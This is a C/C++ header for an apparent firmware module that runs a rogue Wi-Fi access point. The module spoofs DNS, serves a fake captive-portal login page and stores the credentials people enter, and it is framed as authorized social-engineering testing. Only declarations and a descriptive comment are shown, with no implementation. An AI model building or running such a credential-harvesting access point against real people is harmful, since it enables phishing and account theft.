#pragma once

#include <cstdint>

/* Rogue access point for social-engineering resilience testing (authorized use only):
   opens a fake, passwordless Wi-Fi network, answers every DNS query with its own IP
   (captive-portal DNS spoofing) and serves a spoofed login page. Credentials typed
   into the page are logged locally so a tester can show what a captive portal captures.
   Takes over the radio; stops the STA link and the read-only web dashboard. */

#define ROGUE_MAX_CREDS 16

typedef struct {
    char user[48];
    char pass[48];
    uint32_t t_ms;
} rogue_cred_t;

typedef struct {
    bool running;
    char ssid[33];
    int clients;        /* stations associated to the rogue AP */
    uint32_t dns_hits;  /* spoofed DNS answers sent */
    uint32_t http_hits; /* captive-portal page loads */
    int cred_count;     /* credentials captured */
} rogue_status_t;

void rogue_ap_init(void);
bool rogue_ap_start(const char *ssid);
void rogue_ap_stop(void);
bool rogue_ap_running(void);
void rogue_ap_status(rogue_status_t *out);
/* Copies up to `max` captured credentials (newest last); returns the count. */
int rogue_ap_creds(rogue_cred_t *out, int max);
